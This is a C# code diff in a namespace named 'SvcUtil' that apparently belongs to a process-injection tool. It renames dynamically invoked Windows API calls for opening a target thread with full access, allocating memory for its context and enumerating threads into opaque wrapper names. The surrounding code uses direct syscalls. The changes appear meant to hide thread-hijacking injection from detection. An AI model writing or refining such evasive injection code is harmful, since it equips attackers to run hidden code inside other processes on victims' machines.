@@ -106,7 +106,7 @@ namespace SvcUtil
                     return false;
 
                 // Step 6: Open the thread handle
-                hThread = DynInvoke.OpenThread(THREAD_ALL_ACCESS, false, threadId);
+                hThread = W.ML(THREAD_ALL_ACCESS, false, threadId);
                 if (hThread == IntPtr.Zero)
                     return false;
 
@@ -117,7 +117,7 @@ namespace SvcUtil
 
                 // Step 8: Get current thread context
                 // Allocate CONTEXT with VirtualAlloc for guaranteed alignment
-                pContext = DynInvoke.VirtualAlloc(
+                pContext = W.MC(
                     IntPtr.Zero, (UIntPtr)CONTEXT_SIZE,
                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
@@ -164,7 +164,7 @@ namespace SvcUtil
             {
                 // Clean up handles and allocations
                 if (pContext != IntPtr.Zero)
-                    DynInvoke.VirtualFree(pContext, UIntPtr.Zero, 0x8000);
+                    W.MD(pContext, UIntPtr.Zero, 0x8000);
                 if (hThread != IntPtr.Zero)
                     Syscall.NtClose(hThread);
                 if (hProcess != IntPtr.Zero)
@@ -179,7 +179,7 @@ namespace SvcUtil
         /// </summary>
         private static uint FindThread(int targetPid)
         {
-            IntPtr hSnap = DynInvoke.CreateToolhelp32Snapshot(
+            IntPtr hSnap = W.MI(
                 TH32CS_SNAPTHREAD, 0);
 
             if (hSnap == IntPtr.Zero || hSnap == (IntPtr)(-1))
@@ -194,7 +194,7 @@ namespace SvcUtil
                 {
                     Marshal.WriteInt32(pTE, teSize); // dwSize field
 
-                    if (!DynInvoke.Thread32First(hSnap, pTE))
+                    if (!W.MJ(hSnap, pTE))
                         return 0;
 
                     do
@@ -206,7 +206,7 @@ namespace SvcUtil
                         // Reset dwSize (Thread32Next may require it)
                         Marshal.WriteInt32(pTE, teSize);
                     }
-                    while (DynInvoke.Thread32Next(hSnap, pTE));
+                    while (W.MK(hSnap, pTE));
                 }
                 finally
                 {
@@ -215,7 +215,7 @@ namespace SvcUtil
             }
             finally
             {
-                DynInvoke.CloseHandle(hSnap);
+                W.M4(hSnap);
             }
 
             return 0;
